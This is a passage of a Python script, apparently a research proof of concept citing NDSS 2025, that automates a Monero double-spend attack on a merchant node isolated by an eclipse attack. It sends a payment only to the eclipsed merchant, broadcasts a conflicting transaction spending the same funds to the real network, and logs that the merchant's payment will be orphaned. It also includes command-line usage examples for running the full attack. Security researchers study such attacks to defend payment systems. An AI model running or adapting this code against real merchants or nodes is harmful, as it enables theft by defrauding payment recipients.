   success = relay_tx_to_node(config.vm2_ip, config.vm2_daemon_port, conflict_hex, do_not_relay=False)
   if success:
       logger.info(f"[+] Conflicting TX (A→C) successfully relayed by VM2!")
   else:
       logger.error(f"[-] Failed to relay conflicting TX to VM2 daemon")
       logger.error(f"[DEBUG] This is likely the sanity check failure")
   logger.info(f"[DEBUG] Step 4 Summary:")
   logger.info(f"[DEBUG]   - Phase 1 TX hash: {original_tx['tx_hash']}")
   logger.info(f"[DEBUG]   - Phase 3 TX hash: {conflict_hash}")
   logger.info(f"[DEBUG]   - Both should have SAME key images (true double-spend)")
   return {
       "tx_hash": conflict_hash,
       "amount": amount_atomic,
   }
def phase4_demonstrate_isolation(config: DoubleSpendConfig, payment_tx: dict, conflict_tx: dict):
   """
   Phase 4: Show that the merchant and real network have different views.
   """
   logger.info("=" * 60)
   logger.info("Phase 4: Demonstrating Network Isolation")
   logger.info("=" * 60)
   # Check merchant's mempool (VM1)
   merchant_pool = get_tx_pool(config.vm1_ip, config.vm1_daemon_port)
   # Check real network mempool (VM2)
   vm2_pool = get_tx_pool(config.vm2_ip, config.vm2_daemon_port)
   logger.info(f"Merchant's mempool ({len(merchant_pool) if merchant_pool else 0} TXs):")
   if merchant_pool:
       for tx in merchant_pool[:5]:
           tx_id = tx.get("id_hash", "?")
           marker = " ← PAYMENT" if tx_id == payment_tx["tx_hash"] else ""
           logger.info(f"  {tx_id}{marker}")
   logger.info(f"\nVM2 (real network) mempool ({len(vm2_pool) if vm2_pool else 0} TXs):")
   if vm2_pool:
       for tx in vm2_pool[:5]:
           tx_id = tx.get("id_hash", "?")
           marker = " ← CONFLICT" if conflict_tx and tx_id == conflict_tx["tx_hash"] else ""
           logger.info(f"  {tx_id}{marker}")
   # Check if merchant has the conflicting TX
   merchant_has_conflict = False
   if merchant_pool and conflict_tx:
       merchant_has_conflict = any(
           tx.get("id_hash") == conflict_tx["tx_hash"] for tx in merchant_pool
       )
   # Check if real network has the payment TX
   real_has_payment = False
   if vm2_pool:
       real_has_payment = any(
           tx.get("id_hash") == payment_tx["tx_hash"] for tx in vm2_pool
       )
   logger.info("\n" + "=" * 60)
   logger.info("DOUBLE-SPEND ATTACK RESULTS")
   logger.info("=" * 60)
   logger.info(f"Payment TX (to merchant): {payment_tx['tx_hash']}")
   if conflict_tx:
       logger.info(f"Conflict TX (to self):    {conflict_tx['tx_hash']}")
   logger.info(f"")
   logger.info(f"Merchant sees payment TX:        YES (eclipsed, only sees attacker's relay)")
   logger.info(f"Real network sees payment TX:    {'YES ✗' if real_has_payment else 'NO ✓ (never relayed)'}")
   if conflict_tx:
       logger.info(f"Merchant sees conflict TX:       {'YES ✗' if merchant_has_conflict else 'NO ✓ (eclipsed)'}")
       logger.info(f"Real network sees conflict TX:   YES (broadcasted normally)")
   logger.info(f"")
   logger.info(f"RESULT: Merchant thinks they received {payment_tx['amount'] / 1e12:.6f} XMR")
   logger.info(f"        but the real network will confirm the conflicting TX instead.")
   logger.info(f"        Once the eclipse ends, the payment TX is orphaned.")
   logger.info("=" * 60)
def run_double_spend_attack(config: DoubleSpendConfig):
   """Execute the full double-spend attack sequence."""
   logger.info("╔══════════════════════════════════════════════════════════╗")
   logger.info("║  Monero Double-Spend Attack via Eclipse (RPC-based)     ║")
   logger.info("║                    NDSS 2025                            ║")
   logger.info("╚══════════════════════════════════════════════════════════╝")
   logger.info(f"VM1 (merchant): {config.vm1_ip}:{config.vm1_daemon_port}")
   logger.info(f"VM2 (real net): {config.vm2_ip}:{config.vm2_daemon_port}")
   logger.info(f"Wallet RPC:     {get_wallet_rpc_url(config)}")
   logger.info("")
   # Step 0: Verify eclipse is active
   if not verify_eclipse(config):
       logger.error("Eclipse not verified. Run the eclipse attack first!")
       return
   
   # Step 0.5: Verify wallet has single output (CRITICAL for double-spend!)
   logger.info("\n" + "=" * 60)
   logger.info("PRE-FLIGHT CHECK: Wallet Output Consolidation")
   logger.info("=" * 60)
   if not verify_single_output(config):
       logger.error("\n" + "!" * 60)
       logger.error("CRITICAL: Wallet does NOT have a single output!")
       logger.error("The double-spend attack will NOT work properly!")
       logger.error("!" * 60)
       response = input("\nDo you want to:")
       logger.info("  1. Consolidate wallet now (sweep_all)")
       logger.info("  2. Proceed anyway (may not be true double-spend)")
       logger.info("  3. Abort")
       choice = input("Enter choice (1/2/3): ").strip()
       
       if choice == "1":
           logger.info("\nConsolidating wallet...")
           if not sweep_dust_via_rpc(config):
               logger.error("Consolidation failed!")
               return
           logger.info("\n" + "!" * 60)
           logger.info("IMPORTANT: Wait for consolidation TX to confirm!")
           logger.info("This can take 2-20 minutes depending on network.")
           logger.info("Check wallet balance to see when it's confirmed.")
           logger.info("Then re-run this script.")
           logger.info("!" * 60)
           return
       elif choice == "3":
           logger.info("Attack aborted by user")
           return
       else:
           logger.warning("Proceeding anyway - results may not show true double-spend!")
   
   input("\n[*] Press ENTER to proceed with Phase 1 (send payment to merchant)...")
   
   # Step 1: Send payment TX only to merchant
   payment_tx = phase1_send_payment_to_merchant(config)
   if not payment_tx:
       logger.error("Phase 1 failed. Cannot continue.")
       return
   # Wait for merchant to process
   logger.info("\nWaiting 5s for merchant to process TX...")
   time.sleep(5)
   # Step 2: Verify merchant sees the payment
   phase2_verify_merchant_sees_payment(config, payment_tx["tx_hash"])
   input("\n[*] Press ENTER to proceed with Phase 3 (broadcast conflicting TX)...")
   # Step 3: Double-spend by sending conflicting TX to real network
   conflict_tx = phase3_double_spend(config, payment_tx)
   # Wait for real network to process
   if conflict_tx:
       logger.info("\nWaiting 5s for real network to process conflicting TX...")
       time.sleep(5)
   # Step 4: Show the isolation
   phase4_demonstrate_isolation(config, payment_tx, conflict_tx)

   
if __name__ == "__main__":
   parser = argparse.ArgumentParser(
       description="Monero Double-Spend Attack via Eclipse (RPC-based)",
       formatter_class=argparse.RawDescriptionHelpFormatter,
       epilog="""
Examples:
 # Check wallet status and outputs
 python double_spend_attack.py --check-wallet
 
 # Full attack (uses default IPs from config)
 python double_spend_attack.py
 
 # Full attack with debug logging
 python double_spend_attack.py --debug
 
 # Custom amount
 python double_spend_attack.py --amount 0.5
       """
   )
   parser.add_argument('--check-wallet', action='store_true',
                      help='Check wallet balance and output status')
   parser.add_argument('--amount', type=float, default=0.1,
                      help='Payment amount in XMR (default: 0.1)')
   parser.add_argument('--debug', action='store_true',
                      help='Enable debug logging (verbose output)')
   args = parser.parse_args()
   # Update logging level if debug flag is set
   if args.debug:
       logging.getLogger().setLevel(logging.DEBUG)
       logger.debug("Debug mode enabled - verbose output active")
   config = DoubleSpendConfig(
       payment_amount=args.amount,
   )
   if args.check_wallet:
       logger.info("╔══════════════════════════════════════════════════════════╗")
       logger.info("║  Wallet Diagnostic Mode                                  ║")
       logger.info("╚══════════════════════════════════════════════════════════╝")
       logger.info("")
       diagnose_wallet_outputs(config)
   else:
       run_double_spend_attack(config)